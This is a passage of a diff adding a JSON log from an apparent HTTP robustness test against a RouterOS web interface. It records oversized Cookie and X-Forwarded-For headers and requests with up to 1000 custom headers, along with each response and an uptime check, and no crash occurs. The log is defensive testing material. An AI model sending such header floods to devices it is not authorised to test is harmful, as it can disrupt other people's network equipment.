+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:02 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:02 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m44s",
+        "uptime_after": "2h4m45s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 36,
+      "category": "oversized_headers",
+      "name": "Cookie 2048B",
+      "description": "Send Cookie header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:07.869207",
+      "details": {
+        "payload_size": 2113,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2113 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:03 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:03 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m45s",
+        "uptime_after": "2h4m45s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 37,
+      "category": "oversized_headers",
+      "name": "Cookie 4096B",
+      "description": "Send Cookie header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:08.688797",
+      "details": {
+        "payload_size": 4161,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4161 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:04 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:04 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m46s",
+        "uptime_after": "2h4m46s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 38,
+      "category": "oversized_headers",
+      "name": "Cookie 8192B",
+      "description": "Send Cookie header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:09.508387",
+      "details": {
+        "payload_size": 8257,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8257 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:04 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m47s",
+        "uptime_after": "2h4m47s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 39,
+      "category": "oversized_headers",
+      "name": "Cookie 16384B",
+      "description": "Send Cookie header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:10.327977",
+      "details": {
+        "payload_size": 16449,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16449 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:05 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m47s",
+        "uptime_after": "2h4m48s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 40,
+      "category": "oversized_headers",
+      "name": "Cookie 65536B",
+      "description": "Send Cookie header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:11.179551",
+      "details": {
+        "payload_size": 65601,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65601 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:06 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m48s",
+        "uptime_after": "2h4m49s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 41,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 256B",
+      "description": "Send X-Forwarded-For header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:11.999141",
+      "details": {
+        "payload_size": 330,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 330 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:07 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:07 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m49s",
+        "uptime_after": "2h4m49s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 42,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 512B",
+      "description": "Send X-Forwarded-For header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:12.818731",
+      "details": {
+        "payload_size": 586,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 586 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:08 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:08 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m50s",
+        "uptime_after": "2h4m50s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 43,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 1024B",
+      "description": "Send X-Forwarded-For header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:13.634323",
+      "details": {
+        "payload_size": 1098,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1098 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:08 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:08 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m51s",
+        "uptime_after": "2h4m51s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 44,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 2048B",
+      "description": "Send X-Forwarded-For header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:14.441919",
+      "details": {
+        "payload_size": 2122,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2122 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:09 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:09 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m52s",
+        "uptime_after": "2h4m52s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 45,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 4096B",
+      "description": "Send X-Forwarded-For header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:15.253513",
+      "details": {
+        "payload_size": 4170,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4170 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:10 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:10 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m52s",
+        "uptime_after": "2h4m53s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 46,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 8192B",
+      "description": "Send X-Forwarded-For header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:16.085097",
+      "details": {
+        "payload_size": 8266,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8266 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:11 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:11 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m53s",
+        "uptime_after": "2h4m54s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 47,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 16384B",
+      "description": "Send X-Forwarded-For header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:16.904687",
+      "details": {
+        "payload_size": 16458,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16458 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:12 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:12 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m54s",
+        "uptime_after": "2h4m54s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 48,
+      "category": "oversized_headers",
+      "name": "X-Forwarded-For 65536B",
+      "description": "Send X-Forwarded-For header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:17.736271",
+      "details": {
+        "payload_size": 65610,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Forwarded-For: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65610 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:13 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m55s",
+        "uptime_after": "2h4m55s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 49,
+      "category": "many_headers",
+      "name": "10 headers",
+      "description": "Send HTTP request with 10 custom headers",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:18.547865",
+      "details": {
+        "payload_size": 265,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Custom-0: value-0\r\nX-Custom-1: value-1\r\nX-Custom-2: value-2\r\nX-Custom-3: value-3\r\nX-Custom-4: value-4\r\nX-Custom-5: value-5\r\nX-Custom-6: value-6\r\nX-Custom-7: value-7\r\nX-Custom-8: value-8\r\nX-Custom-9: value-9\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:13 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:13 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m56s",
+        "uptime_after": "2h4m56s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 50,
+      "category": "many_headers",
+      "name": "50 headers",
+      "description": "Send HTTP request with 50 custom headers",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:19.351463",
+      "details": {
+        "payload_size": 1185,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Custom-0: value-0\r\nX-Custom-1: value-1\r\nX-Custom-2: value-2\r\nX-Custom-3: value-3\r\nX-Custom-4: value-4\r\nX-Custom-5: value-5\r\nX-Custom-6: value-6\r\nX-Custom-7: value-7\r\nX-Custom-8: value-8\r\nX-Custom-9: value-9\r\nX-Custom-10: value-10\r\nX-Custom-11: value-11\r\nX-Custom-1... [truncated, total 1185 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:14 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:14 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m57s",
+        "uptime_after": "2h4m57s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 51,
+      "category": "many_headers",
+      "name": "100 headers",
+      "description": "Send HTTP request with 100 custom headers",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:20.163057",
+      "details": {
+        "payload_size": 2335,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Custom-0: value-0\r\nX-Custom-1: value-1\r\nX-Custom-2: value-2\r\nX-Custom-3: value-3\r\nX-Custom-4: value-4\r\nX-Custom-5: value-5\r\nX-Custom-6: value-6\r\nX-Custom-7: value-7\r\nX-Custom-8: value-8\r\nX-Custom-9: value-9\r\nX-Custom-10: value-10\r\nX-Custom-11: value-11\r\nX-Custom-1... [truncated, total 2335 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:15 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:15 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m57s",
+        "uptime_after": "2h4m58s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 52,
+      "category": "many_headers",
+      "name": "500 headers",
+      "description": "Send HTTP request with 500 custom headers",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:20.970653",
+      "details": {
+        "payload_size": 12335,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Custom-0: value-0\r\nX-Custom-1: value-1\r\nX-Custom-2: value-2\r\nX-Custom-3: value-3\r\nX-Custom-4: value-4\r\nX-Custom-5: value-5\r\nX-Custom-6: value-6\r\nX-Custom-7: value-7\r\nX-Custom-8: value-8\r\nX-Custom-9: value-9\r\nX-Custom-10: value-10\r\nX-Custom-11: value-11\r\nX-Custom-1... [truncated, total 12335 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:16 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m58s",
+        "uptime_after": "2h4m58s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 53,
+      "category": "many_headers",
+      "name": "1000 headers",
+      "description": "Send HTTP request with 1000 custom headers",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:21.786245",
+      "details": {
+        "payload_size": 24835,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Custom-0: value-0\r\nX-Custom-1: value-1\r\nX-Custom-2: value-2\r\nX-Custom-3: value-3\r\nX-Custom-4: value-4\r\nX-Custom-5: value-5\r\nX-Custom-6: value-6\r\nX-Custom-7: value-7\r\nX-Custom-8: value-8\r\nX-Custom-9: value-9\r\nX-Custom-10: value-10\r\nX-Custom-11: value-11\r\nX-Custom-1... [truncated, total 24835 chars]",
